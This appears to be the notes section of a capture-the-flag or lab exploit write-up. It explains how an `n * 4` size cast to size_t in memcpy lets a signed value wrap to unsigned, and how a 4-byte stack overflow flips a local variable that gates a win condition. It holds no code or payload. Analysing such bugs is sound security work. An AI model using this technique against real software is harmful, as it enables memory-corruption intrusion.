## Notes

### Why `n * 4` instead of `n`?

Likely an ancient `sizeof(int)` multiplier from when the author imagined copying an array of `int`s. The cast to `size_t` during the memcpy call is where signed wraps to unsigned and the exploit opens up.

### Variable overwrite vs. return address overwrite

Classic stack-buffer-overflow exploits target the saved return address. Here the overflow is only 4 bytes past `buf`, nowhere near the saved EIP at `ebp+4`. Instead it overwrites a stack local that gates a win condition. No shellcode, no ret hijack, just flipping one integer.
